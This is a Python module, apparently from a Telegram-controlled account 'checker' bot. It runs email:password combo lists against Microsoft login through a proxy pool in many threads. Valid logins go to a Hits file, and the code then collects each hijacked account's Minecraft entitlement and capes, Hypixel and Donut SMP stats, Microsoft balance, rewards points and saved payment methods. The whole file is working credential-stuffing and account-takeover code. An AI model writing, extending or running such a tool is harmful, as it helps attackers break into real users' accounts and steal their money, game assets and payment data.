"""The check engine — runs N worker threads against a combo list."""

from __future__ import annotations

import logging
import threading
from concurrent.futures import ThreadPoolExecutor, wait
from typing import Callable, Optional

from ..auth.microsoft import authenticate
from ..auth.proxies import ProxyPool
from ..capture.capture import Capture
from ..capture.donut import fetch_donut, is_enabled as donut_enabled
from ..capture.hypixel import fetch_hypixel
from ..capture.microsoft import (
    fetch_balance, fetch_payment_methods, fetch_rewards_points,
)
from ..capture.minecraft import fetch_minecraft_capture
from .progress import Progress
from .results import ResultStore

log = logging.getLogger(__name__)


class CheckEngine:
    """Self-contained worker-pool checker.

    The engine is intentionally synchronous internally — it spawns its own
    threads and reports through the threadsafe :class:`Progress` object. The
    asyncio side of the bot just runs ``engine.start()`` in an executor and
    polls progress to update the Telegram message.
    """

    def __init__(
        self,
        *,
        combos: list[str],
        proxies: list[str],
        threads: int,
        progress: Progress,
        results: ResultStore,
        on_hit: Optional[Callable[[Capture], None]] = None,
    ) -> None:
        self.combos = list(combos)
        self.proxy_pool = ProxyPool(proxies)
        self.threads = max(1, min(threads, max(1, len(self.combos))))
        self.progress = progress
        self.results = results
        self.on_hit = on_hit
        self._stop = threading.Event()
        self._token_cache: dict = {}

    def stop(self) -> None:
        self._stop.set()

    def start(self) -> None:
        if not self.combos:
            return
        with ThreadPoolExecutor(max_workers=self.threads, thread_name_prefix="naksh-") as ex:
            futures = [ex.submit(self._check_one, combo) for combo in self.combos]
            wait(futures)

    # ------------------------------------------------------------------
    def _check_one(self, combo: str) -> None:
        if self._stop.is_set():
            return
        if ":" not in combo:
            self.progress.error()
            self.results.write("Errors", f"{combo}  (no colon)")
            return
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()

        try:
            res = authenticate(email, password, pool=self.proxy_pool or None)
        except Exception as exc:
            log.exception("auth crash for %s", email)
            self.progress.error()
            self.results.write("Errors", f"{email}:{password}  ({exc})")
            return

        if res.status == "2fa":
            self.progress.twofa()
            self.results.write("2fa", f"{email}:{password}")
            return
        if res.status == "bad":
            self.progress.bad()
            self.results.write("Bad", f"{email}:{password}")
            return
        if res.status == "error":
            self.progress.error()
            self.results.write("Errors", f"{email}:{password}  ({res.detail})")
            return

        # status == "hit"
        assert res.session and res.mc_token
        capture = Capture(email=email, password=password)
        try:
            self._capture_minecraft(res, capture)
            if not capture.account_type or capture.account_type == "Unknown":
                # Token exists but no MC entitlement → not a true hit.
                self.progress.bad()
                self.results.write("Bad", f"{email}:{password}  (no MC entitlement)")
                return
            self._capture_extras(res, capture)
        except Exception as exc:
            log.exception("capture failed for %s", email)
            # We still got a valid login → treat as a Hit but log the error.
            self.results.write("Errors", f"{email}:{password}  (capture: {exc})")

        self._record_hit(capture)

    # ------------------------------------------------------------------
    def _capture_minecraft(self, res, capture: Capture) -> None:
        account_type, username, uuid_str, capes = fetch_minecraft_capture(
            res.session, res.mc_token,
        )
        capture.account_type = account_type or "Unknown"
        capture.mc_username = username
        capture.uuid = uuid_str
        capture.capes = capes

    def _capture_extras(self, res, capture: Capture) -> None:
        # Hypixel best-effort
        hx = fetch_hypixel(capture.mc_username, capture.uuid)
        if hx:
            capture.hypixel_level = hx.get("level")
            capture.bedwars_stars = hx.get("bedwars_stars")
            capture.skywars_stars = hx.get("skywars_stars")
            capture.skyblock_coins = hx.get("skyblock_coins")
            capture.skyblock_networth = hx.get("skyblock_networth")
            capture.skyblock_level = hx.get("skyblock_level")
            self.results.write_dedupe(
                "Hypixel_Capture",
                f"{capture.email}:{capture.password} | {hx}",
            )

        # Donut SMP — only if API key is configured
        if donut_enabled():
            donut = fetch_donut(capture.mc_username)
            if donut:
                capture.donut_money = str(donut.get("money") or "")
                capture.donut_kills = donut.get("kills")
                capture.donut_playtime = str(donut.get("playtime") or "")
                capture.donut_banned = donut.get("banned")
                self.results.write_dedupe(
                    "Donut_Capture",
                    f"{capture.email}:{capture.password} | {donut}",
                )

        # Microsoft extras
        bal = fetch_balance(res.session, self._token_cache)
        if bal:
            capture.ms_balance = bal
            self.results.write_dedupe(
                "MS_Balance", f"{capture.email}:{capture.password} | {bal}",
            )
        points = fetch_rewards_points(res.session)
        if points:
            capture.ms_rewards = points
            self.results.write_dedupe(
                "MS_Points", f"{capture.email}:{capture.password} | {points}",
            )
        payments = fetch_payment_methods(res.session, self._token_cache)
        if payments:
            capture.ms_payment_methods = payments
            self.results.write_dedupe(
                "MS_Payments",
                f"{capture.email}:{capture.password} | {' ; '.join(payments)}",
            )

    def _record_hit(self, capture: Capture) -> None:
        self.progress.hit(capture.account_type)

        line = f"{capture.email}:{capture.password}"
        self.results.write("Hits", line)

        # Per-tier files
        atype = capture.account_type.upper()
        if "ULTIMATE" in atype:
            self.results.write("XGPU", line)
        elif "GAME PASS" in atype:
            self.results.write("XGP", line)
        if "NORMAL" in atype or "MINECRAFT" in atype:
            self.results.write("Normal", line)

        # Pretty capture line
        self.results.write("Capture", capture.builder())

        if self.on_hit:
            try:
                self.on_hit(capture)
            except Exception:
                log.exception("on_hit callback raised")
